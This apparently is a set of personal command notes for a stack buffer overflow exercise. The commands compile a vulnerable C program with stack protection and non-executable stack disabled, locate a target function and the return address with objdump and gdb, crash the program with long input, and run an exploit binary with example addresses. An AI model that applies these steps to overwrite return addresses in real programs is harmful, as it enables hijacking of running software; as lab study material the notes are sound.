gcc ./vuln_program.c -fno-stack-protector -z execstack -static -o vuln_program

chmod+x exploit.c

objdump -D ./vuln_program | grep target : objdump

gdb ./vuln_program
break main
run
info address target
break prompt
continue
info frame
break gets
continue
info registers eax
quit


gcc exploit.c -o exploit

gcc -Wall -Wextra -o exploit exploit.c

python3 -c 'print("A"*100)' | ./vuln_program


./exploit <target function address> <buffer start address> <address of return address>

e.g.

./exploit 0x80488f3 0xbfffef50 0xbfffefdc
